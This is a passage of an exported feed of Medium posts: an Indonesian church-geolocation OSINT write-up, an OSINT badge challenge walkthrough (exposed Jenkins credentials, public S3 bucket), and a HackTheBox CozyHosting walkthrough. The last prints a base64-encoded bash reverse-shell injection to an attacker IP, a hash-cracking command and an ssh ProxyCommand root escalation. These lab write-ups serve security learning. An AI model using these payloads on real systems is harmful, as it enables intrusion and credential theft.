<p Untuk mempersempit lokasi, saya menggunakan “Google Lens,” alat pemindai gambar dalam ekosistem Google. Dengan menggunakan “Google Lens,” saya memasukkan gambar ke dalam sistem, bertujuan untuk menemukan kecocokan atau gambar serupa secara online. Pendekatan ini menggabungkan analisis manusia dengan bantuan AI, secara efektif memajukan penyelidikan. Integrasi metode tradisional dan inovasi teknologi mencontohkan esensi OSINT</p <p “Google Lens” memberikan berbagai kecocokan terkait gereja. Namun, untuk menyempurnakan pencarian, saya menambahkan “<strong Belanda </strong + <strong Belgia</strong ” ke kueri. Modifikasi ini bertujuan untuk mengarahkan pencarian ke gereja gereja yang memiliki kesamaan visual di kedua negara. Tujuannya adalah untuk menunjuk karakteristik arsitektur, meningkatkan kemungkinan mengidentifikasi lokasi yang sulit dipahami. Pendekatan terfokus ini menunjukkan perpaduan antara bantuan teknologi dan kecermatan investigasi, yang melambangkan sifat dinamis dari strategi OSINT.</p <p Di antara berbagai hasil, gambar yang sangat mirip menarik perhatian saya — itu cocok dengan kata “<em MariaKerk</em ” dari <strong Wikidata</strong . Penemuan ini menandai tonggak penting dalam penyelidikan. Keselarasan elemen visual antara gambar dan gambar “<em MariaKerk</em ” menunjukkan kemungkinan hubungan ke lokasi yang sulit dipahami.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 tIwGerm5ERelKeheKu6Oog.png\" </figure <p Setelah meng klik gambarnya, saya diarahkan ke situs web <strong Wikidata</strong . Gambar tersebut dikaitkan dengan “<em Mariakerk</em ,” sebuah gereja yang berada di kota <strong Apeldoorn </strong di <strong Belanda</strong .</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 L2xJ803poC n Ijsd1VK8g.png\" </figure <p Berikut gambar ukuran aslinya.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 5DHleWocGAZ3YMmTFutFAA.png\" </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/322/1 2IkBQY8rxQCjfZldrolksQ.png\" </figure <p Saya memutuskan untuk googling kembali agar mendapatkan lebih banyak informasi tentang kota tersebut. <strong Apeldoorn </strong adalah kota kecil di <strong Belanda</strong yang berjarak sekitar 1 jam perjalanan dari ibu kota <strong Amsterdam</strong </p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 B yAk3i2JYbAF 6Xbd0KpQ.png\" </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 G0g5IXpQdg4PkraYSMy48w.png\" </figure <p Saya memutuskan untuk melihat semua daftar Gereja yang ada di kota <strong Apeldoorn</strong .</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 tE4TwD6zIEkfM QdL2cjxg.png\" </figure <p Saya menemukan sebuah situs yang memuat list daftar Gereja yang ada di kota tersebut.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/855/1 mFFCiaum9t8sBKue3IsR8Q.png\" </figure <p Disini saya mencoba membuka situs web resmi “<strong Badan Warisan Budaya Belanda</strong ” <strong (Rijksdienst voor het Cultureel Erfgoed)</strong untuk memeriksa Gereja yang masuk kedalam itus Warisan Budaya di <strong Belanda</strong .</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 4ryRtvKVh1F3CHswSsqpcQ.png\" </figure <p Untuk mencari informasi selanjutnya, saya menggunakan teknik <em Google Dorks</em untuk menemukan detail lokasi dan nama gereja dalam bahasa Belanda dengan kata “Kerk” di dalam situs resmi “<strong Badan Warisan Budaya Belanda</strong ”.</p <pre inurl:monumentenregister.cultureelerfgoed.nl/ + intext:Kerk</pre <p Dan hasilnya mendapatkan beberapa informasi berikut :</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 HzPSnd79uJ4ZUlIFwPe03w.png\" </figure <p Hal itu memberi saya rincian dan informasi lengkap tentang gereja tersebut dan juga lokasinya dari situs web <em “The Catholic Directory”</em .</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 DIRLBetVsvnESwvkykWmIA.png\" </figure <p Dengan menggunakan Google Dorks kembali, saya juga menemukan file PDF dengan informasi terkait gereja potensial tersebut. termasuk Nomor monumen, tanggal pendaftaran, lokasi, jenis monumen (gereja), dan lain lain.</p <p <a href=\"https://monumentenregister.cultureelerfgoed.nl/monumenten/pdf/8161\" LINK PDF!</a </p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/692/1 RDy1HUt5S4yP5vfpP9Z5 g.png\" </figure <p Saya menemukan bahwa gereja ini memiliki nama resmi selain “<em Mariakerk</em ” — nama resminya adalah “<em Onze Lieve Vrouwe ten Hemelopnemingkerk</em ”. Kemudian saya memutuskan untuk mencari di Google dan menemukan lebih dari 20.000 hasil yang mana itu sangat banyak sekali …</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 EMkwvNzzcFQEgpoEWW cCw.png\" </figure <p Saya telah memutuskan untuk melakukan pencarian saya melalui Google Dorks dan menambahkan perintah “location:”, yang memberi saya 5 hasil. Seperti yang dapat Anda lihat, nama gereja dan juga alamat dari situs web <em “The Catholic Directory”</em .</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 90t1UYS156mUQBL3UlJmKA.png\" </figure <p Gambar yang sama dari <strong Wikidata</strong .</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/797/1 B2J864KwncoCQ9DnQBraew.png\" </figure <p Berikut adalah kemungkinan lokasi gereja dengan nama baru yang saya temukan, dan gambar yang sama dari situs web <strong Wikidata</strong yang sebelumnya memberi saya nama “<em Mariakerk</em ”.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 qUkJgqmYoqloCnHKf SJpg.png\" </figure <p Dengan penyelidikan OSINT yang membuahkan hasil, saya mengalihkan perhatian saya pada semua temuan berharga yang dikumpulkan dari berbagai sumber. Namun, hasil sebenernya dari proses menyelesaikan challenge ini terletak pada fase menggali informasi fisik dari lokasi tersebut.</p <p Fokus saya beralih ke alamat berikut<strong : “Hoofdstraat 18, 7311 KB Apeldoorn, Belanda”. </strong Dengan berbekal <strong Google Earth PRO</strong , sebuah alat yang mencakup citra satelit 3D, peta, dan tampilan jalan. Kemampuan <strong Google Earth PRO</strong terbukti sangat berharga, menawarkan eksplorasi multidimensi dari lokasi tersebut.</p <p Dengan <strong Google Earth PRO</strong memungkinkan saya untuk tidak hanya menyaksikan lokasi tetapi juga melihatnya dalam konteks lingkungannya. Perspektif holistik ini merangkum esensi OSINT — mengubah petunjuk digital menjadi pengetahuan nyata melalui perpaduan teknologi dan hasil investigasi.</p <p Puncak dari challenge ini bukan hanya identifikasi lokasi gereja, itu adalah sintesis data, teknologi, dan eksplorasi saja. Kemampuan untuk menjembatani dunia virtual dan fisik melalui alat alat seperti <strong Google Earth PRO</strong mewujudkan inti dari OSINT.</p <p Berikut hasil akhir dari analisis Gambar pada challenges OSINT kali ini.</p <pre Hoofdstraat 18, 7311 KB Apeldoorn, Belanda</pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 Vhd4fUjaYJW kmJf8PHrzg.png\" </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 NAjuS 3TEwsaVR3LDYBTfA.png\" </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 FQRPDaohQ056jMDy5fbfiQ.png\" </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 IxXYE2DzyOrcS1QQuJKSCg.png\" </figure <p Sekian dan Terima kasih…</p <img src=\"https://medium.com/ /stat?event=post.clientViewed&amp;referrerSource=full rss&amp;postId=6313e8d9f067\" width=\"1\" height=\"1\" alt=\"\"",
    "tags": [
      "imint",
      "osint-investigation",
      "geolocation"
    ],
    "category": "Medium Article",
    "type": "medium",
    "url": "https://angganvryn.medium.com/osint-challenge-the-church-deep-image-analysis-using-imagery-intelligence-technique-6313e8d9f067?source=rss-e8b9da247cdf------2",
    "publishedDate": "2023-11-03 22:24:44",
    "updatedAt": "2023-11-03 22:24:44",
    "readingTime": 8,
    "cover": null
  },
  {
    "id": "https://medium.com/p/87bda73e0e0b",
    "slug": "https://medium.com/p/87bda73e0e0b",
    "title": "SecOps — OSINT Badge Hacking",
    "content": "<h3 SecOps — OSINT Badge Hacking</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/395/1 0MRcaMaocxys1tB54JjWAA.png\" </figure <blockquote OSINTOrg has created some cool badges. You need to perform an open source intelligence assessment on their organization and find out about their internet presence and employee information to get the flags and the cool badges.</blockquote <blockquote <em We will resolve VulnMachine’s OSINT challenges that involve searching social networks, gist, and Jenkins servers for information to find flags and complete challenges.</em </blockquote <blockquote These challenges are part of a series of OSINT (open source intelligence) challenges, in which we’re asked to evaluate open source intelligence on an organization’s external assets.</blockquote <ul <li The first challenge is to find the organization’s social media accounts and its employees’ profiles.</li <li For the second challenge, you should look for additional information in git repositories belonging to the organization and its employees.</li <li In the third challenge, the goal is to find and analyze Jenkins’ production server.</li <li Finally, in the fourth challenge, you will have to identify cloud based assets related to the organization.</li </ul <p <strong OSINT 1</strong </p <p We’re told to focus on social networks first; so let’s see if there is a social media account called OSINTOrg. Although we could do this manually, it would be better to use a name checker tool for automation purposes. We will use namechecker’s online service, but you could use the Sherlock tool or a similar tool.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/562/1 CgS01sAfEv7NlBbUaSUJtg.png\" </figure <p We get an account on Twitter related to the organization.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/743/1 NHS 4K8mIDkWuRxhl5x5tw.png\" </figure <p Reviewing the profile, we see that 3 of its followers include a reference to this account in their bio.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/734/1 TeQRTGVtD0mI0gUtWoOr g.png\" </figure <p By analyzing the interactions between profiles, we can obtain our first flag, on a tweet response.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/745/1 Efhzh2WTImayWZ1m6arqxA.png\" </figure <p <strong OSINT 2</strong </p <p From the tweet of the previous challenge we can see a link pointing to a repo of a GitHub organization, although the link does not appear to be public it opens the door to investigate the organization’s repository.</p <p Reviewing the organization, we can find 2 users linked to it, they seem to correspond to the Twitter accounts that interacted in the previous tweet.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 T 6nVus4 umS19fEqnyB4g.png\" </figure <p Looking for the organization and users in the different GitHub platforms (GitHub, gist, and GitLab), we found some gist users.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 8Bj3D356hw aEsP0GTikIg.png\" </figure <p Reviewing the gists, we can find a flag in the comments.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 Lu7NaCukyGqVhd9mV7DFOg.png\" </figure <p <strong OSINT 3</strong </p <p Starting from the end of the previous challenge, it will be easy to find the domain that points to the Jenkins “<em osintorg emilyosintorg prod.osintorg.com</em ”.</p <p We can see that, although when accessing from the browser directly, we can’t see anything, there is an associated DNS.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/653/1 hFdJtsGsMR4eA8hHXJK4rg.png\" </figure <p Now we have two options, either we can look for the standard Jenkins port or we can scan the server with nmap looking for an open port. In both cases, we will reach the Jenkins service on port 8080.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/855/1 h9w1P46g9IIYegLA8RoloA.png\" </figure <p We can easily access the credentials stored on the server since we do not need credentials to access the server.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 5kZy9APweRBA64BfpfYWsQ.png\" </figure <p <strong OSINT 4</strong </p <p For the last flag, we will focus on information related to deployments. Within the deployment logs, we can see the address of an AWS S3 bucket.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 JDRMzDDOraDvry8LmU3AQ.png\" </figure <p If we list the bucket, we see a file called FLAG.txt, and we can access it using the CLI. The whole process is explained here :</p <pre aws s3 ls s3 osint jenkins no sign request</pre <ul <li aws s3 ls s3 osint jenkins no sign request</li </ul <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/488/1 bZA2VL6C6NHCoC8zLZ17UQ.png\" </figure <p This command is used to list the files and directories within an S3 bucket named “s3 osint jenkins”. When executed, the ls option indicates that you want to list the contents of the bucket. The no sign request flag is used to bypass the request signing process, this works only in situations where public access is enabled.</p <pre aws s3 cp s3://s3 osint jenkins/FLAG.txt . no sign request</pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/601/1 MffEnZxA06u6qUQ612aV4Q.png\" </figure <p You can use the following command to copy a file from the S3 bucket named “s3 osint jenkins” to the current directory on your local machine.</p <blockquote The path s3://s3 osint jenkins/FLAG.txt specifies the location of the file you want to copy. The dot (.) indicates the current directory as the destination for the copy.Similarly to the previous command, the no sign request option is used to skip the request signing process.</blockquote <img src=\"https://medium.com/ /stat?event=post.clientViewed&amp;referrerSource=full rss&amp;postId=87bda73e0e0b\" width=\"1\" height=\"1\" alt=\"\"",
    "excerpt": "<h3 SecOps — OSINT Badge Hacking</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/395/1 0MRcaMaocxys1tB54JjWAA.png\" </figure <blockquote OSINTOrg has created some cool badges. You need to perform an open…",
    "description": "<h3 SecOps — OSINT Badge Hacking</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/395/1 0MRcaMaocxys1tB54JjWAA.png\" </figure <blockquote OSINTOrg has created some cool badges. You need to perform an open source intelligence assessment on their organization and find out about their internet presence and employee information to get the flags and the cool badges.</blockquote <blockquote <em We will resolve VulnMachine’s OSINT challenges that involve searching social networks, gist, and Jenkins servers for information to find flags and complete challenges.</em </blockquote <blockquote These challenges are part of a series of OSINT (open source intelligence) challenges, in which we’re asked to evaluate open source intelligence on an organization’s external assets.</blockquote <ul <li The first challenge is to find the organization’s social media accounts and its employees’ profiles.</li <li For the second challenge, you should look for additional information in git repositories belonging to the organization and its employees.</li <li In the third challenge, the goal is to find and analyze Jenkins’ production server.</li <li Finally, in the fourth challenge, you will have to identify cloud based assets related to the organization.</li </ul <p <strong OSINT 1</strong </p <p We’re told to focus on social networks first; so let’s see if there is a social media account called OSINTOrg. Although we could do this manually, it would be better to use a name checker tool for automation purposes. We will use namechecker’s online service, but you could use the Sherlock tool or a similar tool.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/562/1 CgS01sAfEv7NlBbUaSUJtg.png\" </figure <p We get an account on Twitter related to the organization.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/743/1 NHS 4K8mIDkWuRxhl5x5tw.png\" </figure <p Reviewing the profile, we see that 3 of its followers include a reference to this account in their bio.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/734/1 TeQRTGVtD0mI0gUtWoOr g.png\" </figure <p By analyzing the interactions between profiles, we can obtain our first flag, on a tweet response.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/745/1 Efhzh2WTImayWZ1m6arqxA.png\" </figure <p <strong OSINT 2</strong </p <p From the tweet of the previous challenge we can see a link pointing to a repo of a GitHub organization, although the link does not appear to be public it opens the door to investigate the organization’s repository.</p <p Reviewing the organization, we can find 2 users linked to it, they seem to correspond to the Twitter accounts that interacted in the previous tweet.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 T 6nVus4 umS19fEqnyB4g.png\" </figure <p Looking for the organization and users in the different GitHub platforms (GitHub, gist, and GitLab), we found some gist users.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 8Bj3D356hw aEsP0GTikIg.png\" </figure <p Reviewing the gists, we can find a flag in the comments.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 Lu7NaCukyGqVhd9mV7DFOg.png\" </figure <p <strong OSINT 3</strong </p <p Starting from the end of the previous challenge, it will be easy to find the domain that points to the Jenkins “<em osintorg emilyosintorg prod.osintorg.com</em ”.</p <p We can see that, although when accessing from the browser directly, we can’t see anything, there is an associated DNS.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/653/1 hFdJtsGsMR4eA8hHXJK4rg.png\" </figure <p Now we have two options, either we can look for the standard Jenkins port or we can scan the server with nmap looking for an open port. In both cases, we will reach the Jenkins service on port 8080.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/855/1 h9w1P46g9IIYegLA8RoloA.png\" </figure <p We can easily access the credentials stored on the server since we do not need credentials to access the server.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 5kZy9APweRBA64BfpfYWsQ.png\" </figure <p <strong OSINT 4</strong </p <p For the last flag, we will focus on information related to deployments. Within the deployment logs, we can see the address of an AWS S3 bucket.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 JDRMzDDOraDvry8LmU3AQ.png\" </figure <p If we list the bucket, we see a file called FLAG.txt, and we can access it using the CLI. The whole process is explained here :</p <pre aws s3 ls s3 osint jenkins no sign request</pre <ul <li aws s3 ls s3 osint jenkins no sign request</li </ul <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/488/1 bZA2VL6C6NHCoC8zLZ17UQ.png\" </figure <p This command is used to list the files and directories within an S3 bucket named “s3 osint jenkins”. When executed, the ls option indicates that you want to list the contents of the bucket. The no sign request flag is used to bypass the request signing process, this works only in situations where public access is enabled.</p <pre aws s3 cp s3://s3 osint jenkins/FLAG.txt . no sign request</pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/601/1 MffEnZxA06u6qUQ612aV4Q.png\" </figure <p You can use the following command to copy a file from the S3 bucket named “s3 osint jenkins” to the current directory on your local machine.</p <blockquote The path s3://s3 osint jenkins/FLAG.txt specifies the location of the file you want to copy. The dot (.) indicates the current directory as the destination for the copy.Similarly to the previous command, the no sign request option is used to skip the request signing process.</blockquote <img src=\"https://medium.com/ /stat?event=post.clientViewed&amp;referrerSource=full rss&amp;postId=87bda73e0e0b\" width=\"1\" height=\"1\" alt=\"\"",
    "tags": [
      "osint-investigation"
    ],
    "category": "Medium Article",
    "type": "medium",
    "url": "https://angganvryn.medium.com/secops-osint-badge-hacking-87bda73e0e0b?source=rss-e8b9da247cdf------2",
    "publishedDate": "2023-10-22 14:38:01",
    "updatedAt": "2023-10-22 14:38:01",
    "readingTime": 4,
    "cover": null
  },
  {
    "id": "https://medium.com/p/41b061e89a96",
    "slug": "https://medium.com/p/41b061e89a96",
    "title": "HackTheBox — CozyHosting",
    "content": "<h3 HackTheBox — CozyHosting</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/300/1 kk9ZKoFrouzJcSN65vx XA.png\" </figure <h3 ENUMERATION</h3 <p Langkah pertama melakukan Information Gathering dengan menggunakan tools <strong Nmap</strong :</p <pre sudo nmap sC sV script vuln oA nmap 10.10.11.230</pre <p Hasil dari <strong Nmap</strong :</p <pre Nmap scan report for 10.10.11.230<br Host is up (0.039s latency).<br Not shown: 997 closed tcp ports (reset)<br PORT STATE SERVICE VERSION<br 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br | vulners: <br | cpe:/a:openbsd:openssh:8.9p1: <br | PRION:CVE 2023 28531 7.5 https://vulners.com/prion/PRION:CVE 2023 28531<br | PRION:CVE 2021 28041 4.6 https://vulners.com/prion/PRION:CVE 2021 28041<br 80/tcp open http nginx 1.18.0 (Ubuntu)<br | http passwd: ERROR: Script execution failed (use d to debug)<br | http server header: nginx/1.18.0 (Ubuntu)<br | http stored xss: Couldn't find any stored XSS vulnerabilities.<br | http csrf: Couldn't find any CSRF vulnerabilities.<br | http dombased xss: Couldn't find any DOM based XSS.<br 1234/tcp open hotline?<br Service Info: OS: Linux; CPE: cpe:/o:linux:linux kernel<br BService detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br Nmap done: 1 IP address (1 host up) scanned in 245.34 seconds</pre <h3 WEB ENUMERATION</h3 <p Dari informasi diatas, pertama tama kita coba meng akses port 80 dan melakukan <em directory scanning</em dengan menggunakan <strong dirsearch</strong :</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 WtmSuvpVSqJx0FK JeBQhw.png\" </figure <pre dirsearch u &lt;url&gt;</pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 rrQriF2r8ANzkmzA4r2H1g.png\" </figure <p Terlihat beberapa path yang menarik , sekarang kita coba untuk menganalisa path /actuator/sessions. Dan terlihat hasil berikut :</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 eksSO2vPh2Joi4C0ulknVQ.png\" </figure <p Response :</p <pre HTTP/1.1 200 <br Server: nginx/1.18.0 (Ubuntu)<br Date: Tue, 12 Sep 2023 12:49:46 GMT<br Content Type: application/vnd.spring boot.actuator.v3+json<br Connection: close<br X Content Type Options: nosniff<br X XSS Protection: 0<br Cache Control: no cache, no store, max age=0, must revalidate<br Pragma: no cache<br Expires: 0<br X Frame Options: DENY<br Content Length: 148<br <br {<br \"0C03A850ED2166893C44DE15E445F006\":\"UNAUTHORIZED\",<br \"62B7CA7EE980EE7E0C6097F0019C697D\":\"kanderson\",<br \"9DF2A368090B8669564428246553919E\":\"UNAUTHORIZED\"<br }</pre <p Terlihat beberapa session cookie, sekarang kita coba melakukan manipulasi session dengan menggunakan cookie Kanderson, dan terlihat kita berhasil masuk ke dalam Dashboard Admin.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 kUWfDBqsaEwIHy73p 204Q.png\" </figure <p Pada burp, terlihat pesan error meng indikasikan adanya celah <strong <em Command Injection</em </strong pada aplikasi ini.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 N7DkBJYMHxZLuBKLXArfzg.png\" </figure <p Sekarang kita coba untuk memasukkan payload berikut untuk mendapatkan RCE :</p <pre /bin/bash i &gt;&amp; /dev/tcp/10.10.16.68/9991 0&gt;&amp;1 &gt; encode Base64<br <br ;echo${IFS}\"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjQ3LzQ0NDQgMD4mMQ==\"|base64${IFS} d|bash;</pre <p Selanjutnya gunakan listener dari <strong netcat</strong untuk mendapatkan reverse shell.</p <pre nc lvnp &lt;port&gt;</pre <p Pada halaman web, kita akan mendapat response 504 Gateway Time out.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 el6UugPRTFSdHn2EkgXFYw.png\" </figure <p Dan pada terminal, terlihat kita berhasil mendapatkan Reverse Shell.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/787/1 fy4IaBu6H1yVdXRk g7qjg.png\" </figure <p Pada tahap ini, terdapat file .jar pada path /app, selanjutnya download file .jar tersebut dengan menggunakan python http server :</p <pre python m http.server 1334</pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 awZ7B0yAWb2 GDBcXKiq7Q.png\" </figure <p Lakukan decompile pada file .jar tersebut dengan menggunakan Online Decompiling Tools, dan setelah dilakukan decompile terlihat hasil berikut pada Application Properties :</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/755/1 yaRY Fs EG IxyZx1 dGww.png\" </figure <p Terlihat beberapa informasi sensitif berupa Database yang menggunakan PostgreSQL dan disini saya mencoba untuk melakukan koneksi ke database tersebut dengan command berikut :</p <pre psql U postgres W h localhost d cozyhosting</pre <blockquote psql: manages and interacts with PostgreSQL databases.</blockquote <blockquote U: specifies the db username to connect to the database</blockquote <blockquote W: prompts the user for the password before connecting to db</blockquote <blockquote h: specifies the hostname of the PostgreSQL server. In this case, it's connecting to the local machine (localhost).</blockquote <blockquote d cozyhosting: name of the database ( d) to connect to, which in this case is \"cozyhosting.\"</blockquote <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 2aHNV2dgAo7Yx 7QhCCkaw.png\" </figure <p Saat berhasil meng akses database cozyhosting, buka table users dengan perintah :</p <pre SELECT FROM users;</pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/805/1 8lLzOR7544vl8wOolF3AAg.png\" </figure <p Pada table tersebut terdapat 2 kredensial. selanjutnya saya melakukan crack pada password dengan menggunakan tools <strong Johntheripper :</strong </p <pre john w /usr/share/wordlists/rockyou.txt hash.txt</pre <p Kemudian setelah berhasil mendapatkan password, saya melakukan Koneksi SSH menggunakan username josh dengan command :</p <pre ssh josh@10.10.11.230</pre <p Saat berhasil masuk akan terlihat file flag user.txt</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 eVLgeejDfVxeoTUNA3nsEw.png\" </figure <p Langkah selanjutnya adalah mencari flag root pada machine ini dengan metode Privilage Escalation.</p <h3 PRIVILAGE ESCALATION</h3 <p Pertama mari kita cek privilage terlebih dahulu dengan command :</p <pre sudo l</pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 bs2bSQ5s2Qgw8pVj58NI8g.png\" </figure <p Di dalam skenario ini, user Josh memiliki akses untuk eksekusi privilage dengan perintah berikut :</p <pre sudo /usr/bin/ssh </pre <p Tujuan selanjutnya adalah mengidentifikasi teknik injection perintah SSH yang sesuai. Untungnya, saya menemukan artikel yang berguna di gotFobins, sumber untuk menemukan teknik Binary Exploitation.</p <p Perintah yang saya gunakan memungkinkan untuk mendapat shell interaktif melalui opsi ProxyCommand, dan itulah yang saya butuhkan:</p <pre ssh o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' x<br o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2': specifies a custom ProxyCommand configuration using the o option. ProxyCommand is used to specify a command that should be executed to establish the SSH connection through a proxy or intermediate server.<br sh: This is the shell (usually /bin/sh or /bin/bash) being invoked as a command.<br 0&lt;&amp;2: redirects file descriptor 0 (stdin) to file descriptor 2 (stderr).<br 1&gt;&amp;2: redirects file descriptor 1 (stdout) to file descriptor 2 (stderr).<br When combined, sh 0&lt;&amp;2 1&gt;&amp;2 essentially redirects both standard input and standard output to standard error. This redirection is a common technique used in reverse shell payloads.<br x: This is the target hostname or IP address to which the SSH connection is being established.</pre <p setelah berhasil eksekusi perintah diatas maka akan mendapatkan hasil seperti berikut :</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/617/1 wIKEC42g3XWBjc SaKAlIQ.png\" </figure <p Selanjutnya adalah membuka file root.txt dengan perintah :</p <pre cat root.txt</pre <img src=\"https://medium.com/ /stat?event=post.clientViewed&amp;referrerSource=full rss&amp;postId=41b061e89a96\" width=\"1\" height=\"1\" alt=\"\"",
    "excerpt": "<h3 HackTheBox — CozyHosting</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/300/1 kk9ZKoFrouzJcSN65vx XA.png\" </figure <h3 ENUMERATION</h3 <p Langkah pertama melakukan Information Gathering dengan mengg…",
    "description": "<h3 HackTheBox — CozyHosting</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/300/1 kk9ZKoFrouzJcSN65vx XA.png\" </figure <h3 ENUMERATION</h3 <p Langkah pertama melakukan Information Gathering dengan menggunakan tools <strong Nmap</strong :</p <pre sudo nmap sC sV script vuln oA nmap 10.10.11.230</pre <p Hasil dari <strong Nmap</strong :</p <pre Nmap scan report for 10.10.11.230<br Host is up (0.039s latency).<br Not shown: 997 closed tcp ports (reset)<br PORT STATE SERVICE VERSION<br 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br | vulners: <br | cpe:/a:openbsd:openssh:8.9p1: <br | PRION:CVE 2023 28531 7.5 https://vulners.com/prion/PRION:CVE 2023 28531<br | PRION:CVE 2021 28041 4.6 https://vulners.com/prion/PRION:CVE 2021 28041<br 80/tcp open http nginx 1.18.0 (Ubuntu)<br | http passwd: ERROR: Script execution failed (use d to debug)<br | http server header: nginx/1.18.0 (Ubuntu)<br | http stored xss: Couldn't find any stored XSS vulnerabilities.<br | http csrf: Couldn't find any CSRF vulnerabilities.<br | http dombased xss: Couldn't find any DOM based XSS.<br 1234/tcp open hotline?<br Service Info: OS: Linux; CPE: cpe:/o:linux:linux kernel<br BService detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br Nmap done: 1 IP address (1 host up) scanned in 245.34 seconds</pre <h3 WEB ENUMERATION</h3 <p Dari informasi diatas, pertama tama kita coba meng akses port 80 dan melakukan <em directory scanning</em dengan menggunakan <strong dirsearch</strong :</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 WtmSuvpVSqJx0FK JeBQhw.png\" </figure <pre dirsearch u &lt;url&gt;</pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 rrQriF2r8ANzkmzA4r2H1g.png\" </figure <p Terlihat beberapa path yang menarik , sekarang kita coba untuk menganalisa path /actuator/sessions. Dan terlihat hasil berikut :</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 eksSO2vPh2Joi4C0ulknVQ.png\" </figure <p Response :</p <pre HTTP/1.1 200 <br Server: nginx/1.18.0 (Ubuntu)<br Date: Tue, 12 Sep 2023 12:49:46 GMT<br Content Type: application/vnd.spring boot.actuator.v3+json<br Connection: close<br X Content Type Options: nosniff<br X XSS Protection: 0<br Cache Control: no cache, no store, max age=0, must revalidate<br Pragma: no cache<br Expires: 0<br X Frame Options: DENY<br Content Length: 148<br <br {<br \"0C03A850ED2166893C44DE15E445F006\":\"UNAUTHORIZED\",<br \"62B7CA7EE980EE7E0C6097F0019C697D\":\"kanderson\",<br \"9DF2A368090B8669564428246553919E\":\"UNAUTHORIZED\"<br }</pre <p Terlihat beberapa session cookie, sekarang kita coba 